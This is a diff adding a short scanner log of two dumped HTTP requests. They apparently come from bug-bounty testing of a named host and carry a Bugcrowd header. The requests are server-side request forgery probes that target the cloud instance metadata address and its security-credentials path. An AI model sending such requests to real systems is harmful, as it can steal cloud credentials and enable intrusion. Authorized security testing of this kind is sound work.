@@ -1,0 +1,17 @@
+[amazon-ec2-ssrf] Dumped HTTP request for http://test.whitelabel.bitpanda.com
+
+
+GET http://test.whitelabel.bitpanda.com/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.1
+Host: test.whitelabel.bitpanda.com
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+
+
+[amazon-ec2-ssrf] Dumped HTTP request for http://test.whitelabel.bitpanda.com
+
+
+@tls-sni: test.whitelabel.bitpanda.com
+GET http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.1
+Host: test.whitelabel.bitpanda.com
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+
+
